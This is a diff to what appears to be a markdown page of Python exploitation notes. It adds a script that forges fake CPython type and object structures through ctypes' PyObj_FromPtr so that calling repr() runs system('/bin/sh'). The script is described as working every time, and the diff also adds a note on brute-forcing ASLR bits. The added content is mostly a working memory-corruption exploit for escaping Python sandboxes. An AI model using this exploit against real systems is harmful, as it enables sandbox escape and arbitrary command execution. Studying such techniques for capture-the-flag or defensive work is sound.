@@ -228,7 +228,37 @@ print(f"[ + ] Fake object id: {hex(id(fake_object))}")
 b = PyObj_FromPtr(id(fake_object) + 0x20) # We're not touching the object!
 ```
 
-**These exploits don't work on the first try. It is recommended to run them several times!**
+**These exploits don't work on the first try. That's becausae we need to bruteforce 4 bits of ASLR. It is recommended to run at least 16 times!**
+
+
+### calling system('/bin/sh') without libc leaks
+**This exploit works 100% of the time**
+
+```py
+from _ctypes import PyObj_FromPtr
+
+context.binary = elf = ELF("/usr/bin/python3", checksec=False)
+libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
+
+str_base_offset = 0x5737c0
+elf.address = id(str) - str_base_offset
+
+print(f"[ + ] elf base address: {hex(elf.address)}")
+
+fake_type_1 = flat(elf.sym['system'])*16
+
+fake_object_1 = flat(
+    b'-bin/sh\x00', # ref_count
+    id(fake_type_1) + 0x20 # ob_type
+)
+
+print(f"[ + ] Fake object id: {hex(id(fake_object_1))}")
+
+
+b = PyObj_FromPtr(id(fake_object_1) + 0x20)
+
+repr(b)
+```
 
 #### source
 https://docs.python.org/3.3/c-api/structures.html#:~:text=%3B%20PyTypeObject%20*ob_type%3B-,PyObject_VAR_HEAD,varies%20from%20instance%20to%20instance.
